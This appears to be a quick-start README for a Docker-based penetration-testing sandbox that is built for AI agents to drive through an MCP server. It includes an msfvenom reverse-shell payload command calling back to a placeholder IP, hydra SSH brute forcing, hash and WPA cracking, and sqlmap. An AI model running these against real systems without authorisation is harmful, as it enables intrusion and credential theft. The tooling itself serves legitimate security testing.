# OPERATIONSPECTRE Quick Start

## 🚀 Quick Start Options

### Option 1: MCP Mode (Recommended for AI Agents)
```bash
# Start everything with MCP integration
./scripts/manage.py start

# Check status
./scripts/manage.py status

# View logs
./scripts/manage.py logs --follow
```

### Option 2: CLI Mode (Traditional)
```bash
# Initialize sandbox
opspectre init

# Run commands
opspectre shell "nmap -sV 192.168.1.1"
opspectre file read /workspace/output/results.txt
```

### Option 3: Automated Pipelines (Multi-Step Workflows)
```bash
# Standard sequential execution
python3 scripts/pipeline_runner.py scripts/pipelines/pentest.yaml --target example.com

# Parallel execution (60-80% faster)
python3 scripts/pipeline_runner.py scripts/pipelines/parallel_pentest.yaml --target example.com --parallel

# CTF challenges
python3 scripts/pipeline_runner.py scripts/pipelines/ctf-web.yaml --target http://10.10.10.10:8080
```

### Option 4: Docker Compose
```bash
# Start with MCP server
docker-compose -f docker-compose.full.yml up -d

# Check status
docker-compose -f docker-compose.full.yml ps
```

## 🏗️ Architecture Comparison

### CLI Mode (Traditional)
```
User → CLI → Docker Container
    ↓      ↓      ↓
Manual  Text    50+ Tools
```

### MCP Mode (AI Optimized)
```
AI Agent → MCP Server → CLI → Docker Container
    ↓         ↓         ↓      ↓
60-80%    Structured Fast   50+ Tools
Token     JSON      CLI   Pre-installed
Saving    Response  Backend  Tools
```

## 📊 MCP Tools Available

| Category | Tools | Description |
|----------|-------|-------------|
| **Network Scanning** | `nmap_scan`, `port_scan` | Port scanning with profiles |
| **Subdomain Discovery** | `subdomain_discovery` | Subdomain enumeration |
| **Web Reconnaissance** | `http_probe`, `nuclei_scan` | HTTP probing and vuln scanning |
| **OSINT** | `osint_passive` | Passive reconnaissance |
| **File Operations** | `file_read`, `file_write` | File management |
| **Sandbox** | `sandbox_status` | Container management |

## 🛠️ Usage Examples

### MCP Mode (AI Agents)
```python
# Python integration
from pi_pentest_recon_mcp import run_reconnaissance

# Execute reconnaissance
results = run_reconnaissance("example.com")
print(f"Found {results['summary']['subdomains_found']} subdomains")

# Direct MCP tool calls
from pi_pentest_recon_mcp import MCPReconExtension

extension = MCPReconExtension()
osint = extension.osint_passive("example.com", method="ct")
subdomains = extension.subdomain_discovery("example.com")
```

### CLI Mode (Manual Usage)
```bash
# Basic reconnaissance
opspectre shell "subfinder -d example.com -o /workspace/recon/subdomains.txt"
opspectre shell "cat /workspace/recon/subdomains.txt | httpx -status-code -title -rate-limit 5 -o /workspace/recon/live-hosts.txt"
opspectre shell "nmap -sV -iL /workspace/recon/live-hosts.txt -oN /workspace/recon/nmap-results.txt"
```

### Network Scanning (CLI)
```bash
# Network scan
nmap -sV -sC -oA /workspace/output/scans/nmap_$(date +%Y%m%d) 192.168.1.0/24

# Web scan
nikto -h http://target.com -o /workspace/output/scans/nikto_$(date +%Y%m%d).txt

# Directory busting
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /workspace/output/scans/gobuster_$(date +%Y%m%d).txt
```

### Exploitation (CLI)
```bash
# Start Metasploit
msfconsole

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP -f exe > /workspace/output/exploits/payload.exe

# Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -o /workspace/output/loot/hydra_ssh.txt
```

### Password Cracking (CLI)
```bash
# Crack NTLM hashes
hashcat -m 1000 /workspace/output/loot/hashes.txt /usr/share/wordlists/rockyou.txt --outfile=/workspace/output/loot/cracked.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt /workspace/output/loot/hashes.txt --pot=/workspace/output/loot/john.pot
```

### Web Testing (CLI)
```bash
# Burp Suite (headless)
burpsuite --headless --project-file=/workspace/output/scans/burp_$(date +%Y%m%d).burp

# SQLMap
sqlmap -u "http://target.com/page?id=1" --batch --output-dir=/workspace/output/scans/sqlmap_$(date +%Y%m%d)
```

### Wireless (CLI)
```bash
# Crack WPA
aircrack-ng -w /usr/share/wordlists/rockyou.txt /workspace/output/loot/handshake.cap -l /workspace/output/loot/wifi_key.txt
```

## 📁 Where Outputs Go

### MCP Mode
```
/workspace/output/
├── recon/           # Reconnaissance results
├── scans/          # Scan outputs
├── osint/          # OSINT collection
├── screenshots/    # Visual recon
└── final_report.txt # Summary report
```

### CLI Mode
```
opspectre_runs/
├── <run-timestamp>/
│   ├── commands.jsonl  # All executed commands
│   ├── artifacts/      # Generated files
│   └── summary.json    # Run overview
```

> **Note:** Results automatically save to both `./output/` and `opspectre_runs/` directories.
> WSL symlinks are handled automatically by the MCP server for Windows integration.

## 🔧 Server Management

### Start/Stop Services
```bash
# Start all services (MCP + sandbox)
./scripts/manage.py start

# Stop all services
./scripts/manage.py stop

# Restart services
./scripts/manage.py restart

# Check status
./scripts/manage.py status
```

### MCP Server Management
```bash
# Start MCP server manually
python scripts/mcp_server.py --host localhost --port 8000

# Check MCP health
curl http://localhost:8000/health

# List MCP tools
curl http://localhost:8000/tools

# Call MCP tool
curl -X POST http://localhost:8000/tools/call \
  -H "Content-Type: application/json" \
  -d '{"tool_name": "sandbox_status", "arguments": {}}'
```

### Container Management
```bash
# Stop containers
docker-compose -f docker-compose.full.yml down

# Check status
docker ps -f name=opspectre-sandbox

# View container logs
docker logs opspectre-sandbox
```

## 🔍 Health Checks

### MCP Server
```bash
# Health check
curl http://localhost:8000/health

# Tool availability
curl http://localhost:8000/tools
```

### CLI Interface
```bash
# Sandbox status
opspectre sandbox status

# Version check
opspectre --version
```

## 🚨 Troubleshooting

### Common Issues

1. **MCP Server Not Starting**
```bash
# Check if port is in use
lsof -i :8000

# Start with different port
./scripts/manage.py start --port 8001
```

2. **Docker Issues**
```bash
# Check Docker status
docker info

# Restart Docker
sudo systemctl restart docker
```

3. **Permission Issues**
```bash
# Fix permissions
chmod +x scripts/*.py
chmod +x scripts/manage.py
```

4. **Tool Not Found**
```bash
# Check if tools are installed in container
docker exec opspectre-sandbox which nmap

docker exec opspectre-sandbox ls -la /usr/local/bin/
```

### Logs Monitoring
```bash
# MCP server logs
./scripts/manage.py logs --service opspectre-mcp --follow

# Sandbox logs
./scripts/manage.py logs --service opspectre-sandbox --follow

# All logs
./scripts/manage.py logs --follow
```

## 📚 Next Steps

### For AI Agents
1. Read `MCP_USAGE.md` for complete tool reference
2. Try `pentest-recon-mcp` skill for advanced reconnaissance
3. Explore `AUTO_STARTUP.md` for production deployment

### For Manual Usage
1. Read `README.md` for complete CLI documentation
2. Explore `docs/` directory for specific tool guides
3. Check `opspectre-tools.md` for complete tool list

## 🖥️ Access GUI Tools
- **VNC**: localhost:5900 (password: opspectre)
- **noVNC**: http://localhost:6080/vnc.html
- **BeEF**: http://localhost:3000
- **Metasploit RPC**: localhost:55553

---

**Note**: MCP mode provides 60-80% token savings for small models while maintaining full functionality. Choose CLI mode for manual usage and MCP mode for AI agent workflows.